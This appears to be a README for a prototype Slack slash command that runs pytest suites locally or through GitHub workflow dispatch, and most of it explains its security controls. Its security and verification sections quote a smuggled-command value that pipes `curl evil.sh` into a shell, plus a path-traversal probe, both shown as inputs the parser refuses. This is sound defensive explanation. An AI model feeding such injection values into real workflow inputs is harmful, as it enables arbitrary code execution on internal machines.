# slack-runtests

A working prototype of the **"Testing via Slack"** design from
[nehsa.net](https://nehsa.net) → Testing: a slash command that lets anyone on
the team run a pytest suite and read the outcome, without a GitHub account, a
VPN, or any knowledge of pytest's command line.

It ships in two versions, and the difference between them is the whole point.

| | What the API does | Where tests run |
|---|---|---|
| **V1** `RUNTESTS_MODE=local` | validates, then runs pytest itself | **the API host** |
| **V2** `RUNTESTS_MODE=github` | validates, then dispatches a workflow | **a self-hosted runner** that polls GitHub |

**V2 is the one you would deploy.** In V1 the process answering the internet is
the process running the tests. V2 breaks that link: the public API never runs a
test — it authenticates, authorises, validates, dispatches, and answers — and
the machine inside your network only ever calls *out*, so it needs no inbound
connectivity and no open port. You also inherit logs, artifacts, retention,
concurrency limits and an approval gate without writing any of them.

## Try it

```bash
bash run.sh                    # terminal 1 — syncs, then starts on :8500
bash test.sh                   # terminal 2 — POSTs a signed slash command
```

**Use `run.sh` rather than a bare `uv run` on the Mac.** This workspace is a
Samba share, so both machines see the same `.venv` — and it is a Linux one. A
Mac that uses it fails with `error: Failed to spawn: ... No such file or
directory (os error 2)`, which names the console script even though the missing
file is the interpreter its shebang points at. `run.sh` sources
`../scripts/uv-env.sh`, which sends macOS to `.venv-macos` and leaves the Linux
`.venv` alone; it also syncs from `uv.lock` first, so a fresh checkout needs
nothing else. Invoke it as `bash run.sh` — the executable bit may not survive
to the Mac over SMB, and `bash run.sh` works either way.


`test.sh` sends a real, correctly-signed Slack payload. Watch **terminal 1** for
the run and its Slack output:

```
[slack:dry-run] post -> #testing
  Starting `webapp` on `staging`
[slack:dry-run] update -> #testing
  ✅ 3 passed  ·  0 failed  ·  1 skipped  ·  in 0.4s
```

More:

```bash
bash test.sh -- -p webapp -k smoke   # your own flags
bash test.sh --results               # read the last run instead of starting one
bash test.sh --bad                   # a rejected command, to see the error
bash test.sh --unsigned              # omit the signature (401 when configured)
RUNTESTS_MODE=github bash run.sh     # V2; dry-runs without a GH token
```

## `slack.py` — the library tests import

```python
from slack_runtests.slack import notify, SlackNotifier

notify("Smoke suite starting")                  # -> #testing
notify("Deploy verified", channel="releases")   # '#' optional

slack = SlackNotifier()
slack.start("Starting webapp @ staging")
slack.progress(passed=12, failed=0, total=50)
slack.finish(passed=48, failed=2, duration=91.4, run_url=...)
```

**With no `SLACK_BOT_TOKEN` it sends nothing and prints what it would have sent,
and to which channel.** The default channel is `#testing`.

That fallback is the design, not a debugging convenience — it is what makes the
library safe to import unconditionally from a test suite. The alternatives are
both worse: raising means every reporting test fails on a laptop, so people stop
calling it; silently doing nothing means you cannot tell "correctly inert" from
"misconfigured in CI and posting nowhere", and you find out weeks later when
someone asks why the channel went quiet.

Other decisions worth knowing:

- **A reporting failure never fails the run.** A Slack outage must not turn a
  green suite red, so network errors are logged and swallowed.
- **Edits are throttled** to one per 5s. `chat.update` is rate limited *per
  method per app*, so an unthrottled 500-test suite breaks every other thing the
  bot posts, not just its own run.
- **Output goes to stderr**, so it cannot corrupt a `--junit-xml` stream or a
  JSON report being piped somewhere.
- **`finish()` posts a summary, never the suite's stdout.** A run's output in a
  channel is how a channel gets muted, and how hostnames and stack traces reach
  a searchable, wide audience.

## Layout

```
slack-runtests/
├── test.sh                          # POST a signed slash command at the local server
├── src/slack_runtests/
│   ├── slack.py                     # the library tests import  ← console fallback
│   ├── parsing.py                   # flags + allowlists (a security boundary)
│   ├── signature.py                 # Slack HMAC verify, and the signer test.sh uses
│   ├── config.py                    # every environment read, in one place
│   ├── api.py                       # the endpoint; V1/V2 switch
│   └── runners/
│       ├── local.py                 # V1 — subprocess pytest here
│       └── github.py                # V2 — workflow_dispatch
├── .github/workflows/runtests.yml   # the action V2 dispatches
└── tests/
    ├── unit/                        # this project's own gate (60 tests)
    └── sample/webapp/               # the demo suite the Slack command runs
```

`tests/sample` is excluded from `testpaths` on purpose: it is the suite the
server executes on demand, not part of this project's gate. Running it here
would conflate "the prototype works" with "the demo suite passes".

## Security — the half that is most of it

The threat model is **not** "a stranger finds the URL"; the signature check
handles that in three lines. It is **everyone already in your Slack workspace**,
which on any real team includes guests, contractors, Slack Connect users from a
customer, and whoever inherits an ex-colleague's laptop. Authentication is easy
here; **authorisation is the work.**

| Control | Where |
|---|---|
| HMAC-SHA256 over the **raw body**, `compare_digest` | `signature.py` |
| Reject timestamps older than 5 minutes — an HMAC does not expire | `signature.py` |
| Pin `team_id` — proves it came from *your* Slack, not just from Slack | `api.py` |
| Allowlist channel **and** user — membership is not entitlement | `api.py` |
| Allowlist every value reaching a path or flag; strict regex on `-k`/`-m` | `parsing.py` |
| Build argv as a **list**, never `shell=True` | `runners/local.py` |
| Map every workflow input through `env:` | `runtests.yml` |
| Idempotent dispatch keyed on `trigger_id` | `api.py` |
| `concurrency:` cap — a slash command is a free trigger for an expensive job | `runtests.yml` |
| Summaries only; detail to the artifact | `slack.py` |

**`prod` is deliberately not a valid server.** If a production run must exist,
put it behind a GitHub Actions environment with required reviewers, so the
approval happens somewhere other than a chat box.

**The `env:` block in the workflow is a security control, not tidiness.** GitHub
substitutes `${{ ... }}` into the script *textually, before any shell sees it*,
so `run: pytest -k ${{ inputs.select }}` with a value of
`smoke"; curl evil.sh | sh; "` is arbitrary code execution on a machine inside
your network. Routing through `env:` makes the value data the shell already
holds. The regex in `parsing.py` is the second lock on the same door; keep both.

### Where this prototype knowingly differs from a real deployment

Stated plainly rather than left to be discovered:

- **With no `SLACK_SIGNING_SECRET` the server accepts unverified requests**, and
  logs a warning on every one. That is how `test.sh` works out of the box. It is
  refused as soon as a secret *is* set, so the insecure path cannot survive into
  a configured deployment — but a real service should not have it at all.
- **`_RUNS` is an in-process dict.** Two uvicorn workers would each get their
  own, and the idempotency guarantee silently disappears. Real deployments need
  Redis or Postgres.
- **V1 parses counts out of pytest's stdout.** The real implementation is the
  reporter plugin on the nehsa.net page, which hooks pytest and gets exact
  numbers. Unparseable output yields zeros rather than a wrong number, and the
  exit code is what decides pass/fail.
- **No GitHub App token minting.** `GITHUB_TOKEN` is read from the environment;
  production wants a ~1h installation token scoped to one repo.
- **`views.open` modals, `--junit-xml` artifact links, and per-user rate limits**
  are all described on the page and not built here.

## Verified

```bash
bash run.sh test -q       # 60 passed
```

Checked, not assumed:

- Full V1 round trip: `test.sh` → 200 ephemeral → background pytest → Slack
  dry-run output with real counts (3 passed, 1 skipped).
- Signed request accepted; **unsigned rejected 401** once a secret is configured.
- `-p ../../etc`, `-s prod`, and `-k 'smoke"; curl evil.sh | sh; "'` all refused.
- A retried `trigger_id` returns "already queued" and starts no second run.
- V2 with no credentials logs the dispatch it *would* have made.
- **Non-vacuity:** three vulnerabilities were planted — always-true signature,
  removed replay window, unrestricted product — and each was caught by the
  suite; green again after restore.

### Testing gap

Unit tier plus the manual end-to-end above. **No E2E tier** — that would need a
real Slack workspace and a real runner. The integration tier is partial: `api.py`
is covered via `TestClient`, but `runners/local.py` is only covered at the argv
level, not by spawning a real subprocess.

## License

Apache License 2.0 — see [LICENSE](LICENSE) and [NOTICE](NOTICE).
Copyright 2026 nehsa.net.
